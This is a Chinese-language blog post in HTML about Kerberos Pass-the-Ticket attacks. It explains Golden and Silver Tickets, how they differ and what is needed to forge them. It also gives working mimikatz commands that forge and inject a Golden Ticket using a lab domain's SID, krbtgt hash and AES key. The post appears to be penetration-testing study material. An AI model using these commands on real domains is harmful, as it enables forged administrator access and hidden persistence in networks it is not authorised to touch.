@@ -1,0 +1,251 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>票据传递攻击 | SiYuan-Rao</title>
+<link rel="shortcut icon" href="https://siyuan-rao.github.io/favicon.ico?v=1733983405965">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://siyuan-rao.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="票据传递攻击 | SiYuan-Rao - Atom Feed" href="https://siyuan-rao.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x01 票据传递攻击（Pass The Ticket，PTT）
+票据传递攻击（PTT）是基于Kerberos认证的一种攻击方式，常用来做后渗透权限维持。黄金票据攻击利用的提前是得到了域内krbtgt用户的NTLM哈希或AES-256的值，..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://siyuan-rao.github.io">
+  <img class="avatar" src="https://siyuan-rao.github.io/images/avatar.png?v=1733983405965" alt="">
+  </a>
+  <h1 class="site-title">
+    SiYuan-Rao
+  </h1>
+  <p class="site-description">
+    <b>One is Team !</b>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              票据传递攻击
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-31
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="0x01-票据传递攻击pass-the-ticketptt">0x01 票据传递攻击（Pass The Ticket，PTT）</h3>
+<p>票据传递攻击（PTT）是基于Kerberos认证的一种攻击方式，常用来做后渗透权限维持。黄金票据攻击利用的提前是得到了域内krbtgt用户的NTLM哈希或AES-256的值，白银票据攻击利用的前提是得到了域内服务账号的NTLM哈希或AES-256的值。票据传递攻击常用来做域控权限维持。</p>
+<h3 id="0x02-黄金票据golden-ticket传递攻击">0x02 黄金票据（Golden Ticket）传递攻击</h3>
+<p>在认证过程中，客户端与KAS的通信会得到TGT认购权证，带着TGT认证权证向TGS请求，得到ST服务票据，用这个ST服务票据可以来访问应用服务器。域中每个用户的ST服务票据都是由krbtgt用户的密码Hash来计算生成的，因此只要我们拿到了krbtgt用户的密码Hash，就可以随意伪造ST服务票据，进而使用ST服务票据登域控制器，使用krbtgt用户Hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击（Pass The Ticket，PTT）。</p>
+<p>域中存在特殊的用户，在域服务器上执行命令net user 可以看到存在krbtgt用户。<br>
+<img src="https://siyuan-rao.github.io/post-images/1704036605714.png" alt="" loading="lazy"><br>
+<img src="https://siyuan-rao.github.io/post-images/1704036719939.png" alt="" loading="lazy"></p>
+<p>创建黄金票据，我们需要知道以下信息：</p>
+<ul>
+<li>伪造的域用户（一般填写域管理员账号）</li>
+<li>域名</li>
+<li>域的SID值（域成员SID值去掉最后一部分）</li>
+<li>krbtgt账号的哈希值或AES-256值</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://siyuan-rao.github.io/post-images/1704037396879.png" alt="" loading="lazy"></figure>
+<h4 id="生成票据与导入票据">生成票据与导入票据</h4>
+<p>方法一：使用mimikatz生成黄金票据并导入。<br>
+privilege::debug<br>
+kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ptt<br>
+<img src="https://siyuan-rao.github.io/post-images/1704039186933.png" alt="" loading="lazy"><br>
+privilege::debug<br>
+kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /aes256:a780c2c18b3287e3448562a36dccb2d57d11fd398b55ce2cd9b128308cef74df /ptt<br>
+<img src="https://siyuan-rao.github.io/post-images/1704089406797.png" alt="" loading="lazy"></p>
+<p>方法二：使用mimikatz生成黄金票据后导入。<br>
+privilege::debug<br>
+# 默认生成ticket.kirbi票据<br>
+kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061<br>
+kerberos::ptt ticket.kirbi<br>
+<img src="https://siyuan-rao.github.io/post-images/1704089736578.png" alt="" loading="lazy"></p>
+<p>privilege::debug<br>
+kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /aes256:a780c2c18b3287e3448562a36dccb2d57d11fd398b55ce2cd9b128308cef74df<br>
+kerberos::ptt ticket.kirbi<br>
+<img src="https://siyuan-rao.github.io/post-images/1704090795061.png" alt="" loading="lazy"></p>
+<h4 id="查看票据">查看票据</h4>
+<p><img src="https://siyuan-rao.github.io/post-images/1704039527957.png" alt="" loading="lazy"><br>
+#以下两个命令均可以看到当前会话中的票据<br>
+kerberos::list<br>
+kerberos::tgt<br>
+<img src="https://siyuan-rao.github.io/post-images/1704039688261.png" alt="" loading="lazy"></p>
+<h4 id="验证黄金票据">验证黄金票据</h4>
+<figure data-type="image" tabindex="2"><img src="https://siyuan-rao.github.io/post-images/1704039803065.png" alt="" loading="lazy"></figure>
+<h4 id="删除票据">删除票据</h4>
+<p>kerberos::purge<br>
+<img src="https://siyuan-rao.github.io/post-images/1704039983623.png" alt="" loading="lazy"></p>
+<h4 id="0x03-白银票据silver-ticket传递攻击">0x03 白银票据（Silver Ticket）传递攻击</h4>
+<p>白银票据Silver Ticket不同黄金票据Golden Ticket。白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控，很少留下日志。黄金票据使用krbtgt账号的密码散列值，利用伪造高权限的TGT向KDC要求颁发具有任意服务访问权限的票据，从而获取域控权限。而白银票据会通过相应的服务账号来伪造TGS，例如：LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限。</p>
+<p>创建白银票据，我们需要知道以下信息：</p>
+<ul>
+<li>伪造的域用户（一般填写域管理员账号）</li>
+<li>域名</li>
+<li>域的SID值（域成员的SID值去掉最后一部分）</li>
+<li>目标服务的FQDN</li>
+<li>可利用的服务</li>
+<li>服务账号的NTLM哈希</li>
+</ul>
+<p><img src="https://siyuan-rao.github.io/post-images/1704092418612.png" alt="" loading="lazy"><br>
+<img src="https://siyuan-rao.github.io/post-images/1704092706403.png" alt="" loading="lazy"><br>
+<img src="https://siyuan-rao.github.io/post-images/1704092787961.png" alt="" loading="lazy"></p>
+<h4 id="0x04-黄金票据与白银票据的不同">0x04 黄金票据与白银票据的不同</h4>
+<p>访问权限不同：</p>
+<ul>
+<li>黄金票据Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限。</li>
+<li>白银票据Silver Ticket：伪造TGS，只能访问指定的服务。</li>
+</ul>
+<p>加密方式不同：</p>
+<ul>
+<li>Golden Ticket由krbtgt的Hash加密。</li>
+<li>Silver Ticket由服务账号（通常为计算机账户）Hash加密</li>
+</ul>
+<p>认证流程不同：Golden Ticket的利用过程需要访问域控，而Silver Ticket不需要。</p>
+<p>隐蔽性不同：白银票据依赖于服务账号的密码散列值，而黄金票据需要利用krbtgt账号的密码散列值，因此白银票据更隐蔽。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x01-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BBpass-the-ticketptt">0x01 票据传递攻击（Pass The Ticket，PTT）</a></li>
+<li><a href="#0x02-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEgolden-ticket%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB">0x02 黄金票据（Golden Ticket）传递攻击</a>
+<ul>
+<li><a href="#%E7%94%9F%E6%88%90%E7%A5%A8%E6%8D%AE%E4%B8%8E%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE">生成票据与导入票据</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E7%A5%A8%E6%8D%AE">查看票据</a></li>
+<li><a href="#%E9%AA%8C%E8%AF%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE">验证黄金票据</a></li>
+<li><a href="#%E5%88%A0%E9%99%A4%E7%A5%A8%E6%8D%AE">删除票据</a></li>
+<li><a href="#0x03-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AEsilver-ticket%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB">0x03 白银票据（Silver Ticket）传递攻击</a></li>
+<li><a href="#0x04-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C">0x04 黄金票据与白银票据的不同</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://siyuan-rao.github.io/ipcdollar/">
+              <h3 class="post-title">
+                IPC$
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://siyuan-rao.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
